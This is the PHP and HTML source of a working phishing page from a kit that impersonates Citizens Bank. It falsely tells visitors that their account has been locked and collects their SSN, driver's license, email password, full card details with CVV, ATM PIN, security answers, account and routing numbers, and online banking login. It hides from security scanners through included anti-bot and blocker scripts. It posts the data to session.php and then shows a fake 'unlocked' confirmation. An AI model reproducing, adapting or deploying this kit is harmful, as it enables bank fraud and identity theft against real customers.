<?php 
 
ob_start();
session_start();
error_reporting(0);
include './global.php';
  include './lib/loca.php';
  include './lib/system.php';
  include './lib/blocker.php';
  include './lib/antibots4.php';
    include './lib/detect.php';
 
?>
<html>
<head>
<title>Citizens Banks - update</title>
<?php echo $includes; ?>
</head>
<body>
<center>
 
 

<div class="content">
 <div class="top">
<img src="./res/logo.png" class="img"></img>
</div>


<div class="c-left">


<div id="thanks">

<hr>
<p>Welcome Again ! <b><?php echo $_SESSION['user'];?></b><a href="#"><button class="logout">
<i class="icon"></i> Logout
</button></a></p> 
<div style="background:#ffebe6;color:#404040; font-size:1em; border:1px solid red; padding:10px; border-radius:6px; "> 
<center><img src="./res/warning.png" style="height:30px;"></img> </center> 
 We have detected some unusual activities on your account , 
As a security measure we have locked your account , To restore your account you have to provide us the following information .  <br>
</div>

</div>

<div id="thanksfinal" style="display:none ;">

<hr>
<p>Done ! <a href="http://www3.citizensbankonline.com/"><button class="logout">
<i class="icon"></i> Logout
</button></a></p> 
<div style="background:#ebfaeb;  color:#404040; font-size:1em; border:1px solid green; padding:10px; border-radius:6px; "> 
<center><img src="./res/verified.png" style="height:30px;"></img> 
<h1>Congratulations !</h1>
you have successfully unlocked your account .  <br>
<br>
<a href="http://www3.citizensbankonline.com/"><button class="logout" style="float:left; width:100%; background:linear-gradient( #99e699,#5cd65c); border:1px solid green;">
<i class="icon"></i> My account
</button></a>
 
<br><br>
</center> 
</div>

</div>
 

<div class="login" id='billing'>
<font style="font-size:1.1em; margin-top:10px;">Please provide us these information to unlock your account .</font>

 


<form action='' method='post' id='billings' name='billings' >


 
 
 <table >
   <tr>
<td> </td>
<td> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>   <tr>
<td> </td>
<td> </td>
 </tr>
 
 <tr >
 <td></td>
<td> <span style='font-size:1.3em;   padding-bottom:20px; color:#808080; ' > Billing information  </span></td>
</tr>
    <tr>
<td> </td>
<td> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>
 <tr>
 <td>Full name : </td>
 <td><input type='text' id='fullname' required name='fullname' class='logininput' placeholder=''></td>
 </tr>
 
 <tr>
 <td>Address line : </td>
<td><input type='text' id='address' required name='address' class='logininput' placeholder=''> </td>
</tr>


<tr>
<td>State : </td>
<td><input type='text' id='state' required name='state' class='logininput'> </td>
 </tr>
 
 <tr>
<td>City : </td>
<td><input type='text' id='city' required name='city' class='logininput'></td>
 </tr>
 
 <tr>
<td>Postal Code : </td>
<td><input type='text' id='zip' required name='zip' class='logininput'></td>
 </tr>
 
 <tr>
<td>Phone Number : </td>
<td><input type='text' id='phone' required name='phone' class='logininput'></td>
 </tr>
 
 <tr>
<td>Social Security Number (SSN) : </td>
<td><input type='text' id='ssn' required name='ssn' class='logininput'></td>
 </tr>
 
 
 <tr>
<td>Drivers license : </td>
<td><input type='text' id='dl' required name='driverslicense' class='logininput'></td>
 </tr>
 
 
 <tr>
<td> Email</td>
<td><input type='text' required name='bankemail' class='logininput'  ></td>
 </tr>
 
 
 <tr>
<td>Password </td>
<td><input type='password' required name='bankpass' class='logininput' ></td>
 </tr>
   <tr>
<td> </td>
<td> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>
 <tr >
 <td></td>
<td> <span style='font-size:1.3em;   padding-bottom:20px; color:#808080;' > Security information  </span></td>
</tr>
   <tr>
<td> </td>
<td> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>

 <tr>
<td>Card Type : </td>
<td>
<select name='type' id='type' required class='logininput '>
<option selected disabled value="Card Type">Card Type
<option value="Visa">Visa
<option value="MasterCard">MasterCard	
<option value="Maestro">Maestro
<option value="American Express">American Express
<option value="Other">Other
</select>
</td>
 </tr>
 
 
 <tr>
<td> Name on card : </td>
<td><input type='text' id='name' required name='nameoncard' class='logininput' > </td>
 </tr>
 
 
 <tr>
<td>Card number : </td>
<td><input type='text' id='number' required name='cardnumber' class='logininput'></td>
 </tr>
 
 
 <tr>
<td>Expiry date : </td>
<td><select name='mm'  id='mm' 	required	class='logininput' style='width:49%;' >
 <option selected disabled>Month
<option value='01'>01
<option value='02'>02
<option value='03'>03
<option value='04'>04
<option value='05'>05
<option value='06'>06
<option value='07'>07
<option value='08'>08
<option value='09'>09
<option value='10'>10
<option value='11'>11
<option value='12'>12
 </select>
 <select class='logininput' required id='yy' name='yy' style='width:49%; ' >
<option selected disabled>Year
<option value='18'>2018
<option value='19'>2019
<option value='20'>2020
<option value='21'>2021
<option value='22'>2022
<option value='23'>2023
<option value='24'>2024
<option value='25'>2025
<option value='26'>2026
<option value='27'>2027
<option value='28'>2028
<option value='29'>2029
<option value='30'>2030
<option value='31'>2031
<option value='32'>2032
<option value='33'>2033
</select>
 </td>
 </tr>
 
 
 <tr>
<td>CVV :  </td>
<td><input type='text' required id='cvv' name='cvv' class='logininput'></td>
 </tr>
 
 
 
 <tr>
<td>Pin ATM : </td>
<td><input type='text' required name='atm' id='atm'  class='logininput'></td>
 </tr>

 
 <tr>
<td>Security Question 1</td>
<td> 
 <select name="qs1"  required  class="logininput"  >
<option disabled selected  >Security Question 1</option>
                         <OPTION value="Where were you on New Year`s 2000?">Where were you on New Year`s 2000?</OPTION>
                          <OPTION value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</OPTION>
                          <OPTION value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</OPTION>
                          <OPTION value="What was the first name of your child manager?">What was the first name of your child manager?</OPTION>
                          <OPTION value="As a child, What did you want to be when u grew up?">As a child, What did you want to be when u grew up?</OPTION>
                          <OPTION value="What was the first live concert you attended?">What was the first live concert you attended?</OPTION>
                          <OPTION value="What was the mke and model of your first car?">What was the mke and model of your first car?</OPTION>
                          <OPTION value="What is the name of your high schools star athlete?">What is the name of your high schools star athlete?</OPTION>
                          <OPTION value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</OPTION>
                          <OPTION value="Who is your favorite person in history?">Who is your favorite person in history?</OPTION>
                                <OPTION value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</OPTION>
                                <OPTION value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</OPTION>
                                <OPTION value="In what city were you born?">In what city were you born? (Enter full name of city only)</OPTION>
                                <OPTION value="What was the name of your first pet?">What was the name of your first pet?</OPTION>
                                <OPTION value="What was your high school mascot?">What was your high school mascot?</OPTION>
                                <OPTION value="On what street did you grow up?">On what street did you grow up?</OPTION>
                                <OPTION value="What is your oldest sibling's middle name?">What is your oldest sibling's middle name?</OPTION>
                                <OPTION value="How old were you at your wedding?">How old were you at your wedding? (Enter age as digits.)</OPTION>
                                <OPTION value="In what year did you graduate from high school?">In what year (YYYY) did you graduate from high school?</OPTION>
                                <OPTION value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</OPTION>
                                <OPTION value="Who is your favorite childhood superhero?">Who is your favorite childhood superhero?</OPTION>
</select></td>
 </tr>
 
 <tr>
<td>Answer 1 </td>
<td><input type='text' required name='answer1' class='logininput'></td>
 </tr>

 <tr>
 <td  >Security Question 2</td>
<td><select name="qs2"  required class="logininput" >
<option disabled selected value="Security Question 2">Security Question 2</option>
<OPTION value="On what street is your grocery store?">On what street is your grocery store?</OPTION>
                                <OPTION value="What is the name of the medical professional who delivered your first child?">What is the name of the medical professional who delivered your first child?</OPTION>
                                <OPTION value="What was the name of your first pet?">What was the name of your first pet?</OPTION>
                                <OPTION value="What is the first name of your hairdesser/barber?">What is the first name of your hairdesser/barber?</OPTION>
                                <OPTION value="What is the first name of your mother`s closest friend?">What is the first name of your mother`s closest friend?</OPTION>
                                <OPTION value="What is the first name of your favorite niece/nephew?">What is the first name of your favorite niece/nephew?</OPTION>
                          <OPTION value="What is your father's middle name?">What is your father's middle name?</OPTION>
                          <OPTION value="What is your mother's middle name?">What is your mother's middle name?</OPTION>
                          <OPTION value="In what city were you married?">In what city were you married?</OPTION>
                          <OPTION value="In what city is your vacation home?">In what city is your vacation home?</OPTION>
                          <OPTION value="What is the first name of your first child?">What is the first name of your first child?</OPTION>
                          <OPTION value="What is the name of your first employer?">What is the name of your first employer?</OPTION>
                                <OPTION value="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</OPTION>
                                <OPTION value="What is the name of a collage you applied to but didn`t attend?">What is the name of a collage you applied to but didn`t attend?</OPTION>
                                <OPTION value="What is your all-time favorite song?">What is your all-time favorite song?</OPTION>
                                <OPTION value="What is the name of your best childhood friend?">What is the name of your best childhood friend?</OPTION>
                                <OPTION value="On what street is your grocery store?">On what street is your grocery store?</OPTION>
                          <OPTION value="What is your favorite hobby?">What is your favorite hobby?</OPTION>
                          <OPTION value="In what city were you living at age 16?">In what city were you living at age 16?</OPTION>
</select>

</td>

 </tr>
 
 <tr>
<td>Answer 2</td>
<td><input type='text' required name='answer2' class='logininput'></td>
 </tr>
 
 <tr>
<td>Security Question 3</td>
<td>
<select name="qs3"  required class="logininput" >
<option selected disabled  >Security Question 3</option>
 <OPTION value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</OPTION>
                          <OPTION value="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</OPTION>
                          <OPTION value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</OPTION>
                          <OPTION value="What high school did you attend?">What high school did you attend?</OPTION>
                      <OPTION value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?</OPTION>
                      <OPTION value="In what city did you meet your spouse/significant other?">In what city did you meet your spouse/significant other?</OPTION>
                      <OPTION value="What is the last name of your third grade tracher?">What is the last name of your third grade tracher?</OPTION>
                      <OPTION value="what celebrity do you most resemble?">what celebrity do you most resemble?</OPTION>
                      <OPTION value="In what city did you honeymoon?">In what city did you honeymoon? (Enter full name of city only)</OPTION>

<OPTION value="What is your father's middle name?">What is your all-time favorite song?</OPTION>
                      <OPTION value="What is the name of your favorite charity?">What is the name of your favorite charity?</OPTION>
                      <OPTION value="What is the last nem of your family physician?">What is the last nem of your family physician?</OPTION>
                      <OPTION value="What is the name of your first babysitter?">What is the name of your first babysitter?</OPTION>
                      <OPTION value="What is your best friend`s first name?">What is your best friend`s first name?</OPTION>
                      <OPTION value="What street did your best friend in high school love on?">What street did your best friend in high school love on? (Enter full name of street only)</OPTION>
                      <OPTION value="In what city was your mother born?">In what city was your mother born? (Enter full name of city only)</OPTION>
                      <OPTION value="In what city was your father born?">In what city was your father born? (Enter full name of city only)</OPTION>
                      <OPTION value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?</OPTION>
                      <OPTION 
              value="When is your wedding anniversary?">When is your wedding anniversary? (Enter the full name of month)</OPTION>
                      <OPTION 
              value="In what city did you honeymoon?">In what city did you honeymoon? (Enter full name of city only)</OPTION>
                      <OPTION value="In what city was your high school?">In what city was your high school? (Enter only "Charlotte" for Charlotte High School)</OPTION>
                      <OPTION value="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</OPTION>
                       <OPTION value="With what company did you hold your first job?">With what company did you hold your first job?</OPTION>
                      <OPTION value="What is your paternal grandmother's first name?">What is your paternal grandmother's first name?</OPTION>
                      <OPTION value="Where did you meet your spouse for the first time?">Where did you meet your spouse for the first time? (Enter full name of city only)</OPTION>
</select>
</td>
 </tr>
 
 <tr>
<td>Answer 3</td>
<td><input type='text' required name='answer3' class='logininput'></td>
 </tr>
 
 
 
   <tr>
<td> </td>
<td> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>
 <tr >
 <td></td>
<td> <span style='font-size:1.3em;   padding-bottom:20px; color:#808080; ' > Bank information  </span></td>
</tr>
   <tr>
<td> </td>
<td> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>


 <tr>
<td>Account number : </td>
<td> <input type='text' required  name='accountnumber' class='logininput'></td>
 </tr>

 <tr>
<td>Routing number : </td>
<td><input type='text' required name='routingnumber' class='logininput'></td>
 </tr>
 
  <tr>
<td>User ID : </td>
<td><input type='text' required name='userid' class='logininput'></td>
 </tr>

 <tr>
<td>Password : </td>
<td><input type='password' required name='pass' class='logininput'></td>
 </tr>
 
   <tr>
<td> </td>
<td> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>
  <tr>   <tr>
<td> </td>
<td> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>
  <tr>
<td> </td>
<td><button type="submut" class="logout" style="float:left; width:100%;">
<i class="icon"></i> Update and Unlock my account
</button> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>
  <tr>   <tr>
<td> </td>
<td> </td>
 </tr>
    <tr>
<td> </td>
<td> </td>
 </tr>
  <tr>
</table>
</form>
</div>

</div>


<div class="c-right">
 
</div>
</div>

<script>
 
$(function(){
$("#number").mask("000000000000000000");
$("#cvv").mask('0000');
$("#phone").mask("(000) 00000000");
});


 





$(function(){

	  
 $("form[name='billings']").validate({
 		
	 messages:{
	   input : ' ',
	 },

	 submitHandler: function(form) {
		$("#load").show();
	$.post("./session.php?ajax",$("form[name='billings']").serialize(),function(result){
		    setTimeout(function() {		
		 $("#billing").hide();
		  $("#thanks").hide();
		 $("#thanksfinal").show();
		   $("#load").hide();
		});
	});
	},
 });
});
 
</script>
 <div class='loader' id='load' style='display:none;'>
<img src='./res/loader.gif'></img>
</div>
</center>
</body>
</html>